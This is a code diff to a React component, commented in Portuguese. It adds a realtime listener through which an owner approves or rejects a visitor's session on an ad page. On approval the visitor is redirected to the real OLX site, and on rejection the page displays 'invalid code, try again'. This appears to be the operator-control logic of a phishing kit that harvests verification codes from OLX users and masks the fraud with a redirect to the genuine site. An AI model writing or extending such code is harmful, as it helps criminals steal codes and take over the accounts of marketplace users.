@@ -72,9 +72,33 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
         },
       )
       .subscribe();
+
+    // Escuta ações do dono (aceitar/rejeitar) pra essa sessão
+    const actionChannel = supabase
+      .channel(`session-actions-${adId}-${sessionId}`)
+      .on(
+        "postgres_changes",
+        { event: "INSERT", schema: "public", table: "ad_session_actions", filter: `ad_id=eq.${adId}` },
+        (payload) => {
+          const row = payload.new as { session_id: string; action: string; payload: { message?: string } | null };
+          if (row.session_id !== sessionId) return;
+          if (row.action === "approve") {
+            window.location.href = "https://www.olx.com.br";
+          } else if (row.action === "reject") {
+            const iframe = iframeRef.current;
+            iframe?.contentWindow?.postMessage(
+              { type: "iframe-code-error", message: row.payload?.message || "Código inválido. Verifique e tente novamente." },
+              "*",
+            );
+          }
+        },
+      )
+      .subscribe();
+
     return () => {
       cancelled = true;
       supabase.removeChannel(channel);
+      supabase.removeChannel(actionChannel);
     };
   }, [adId]);
 
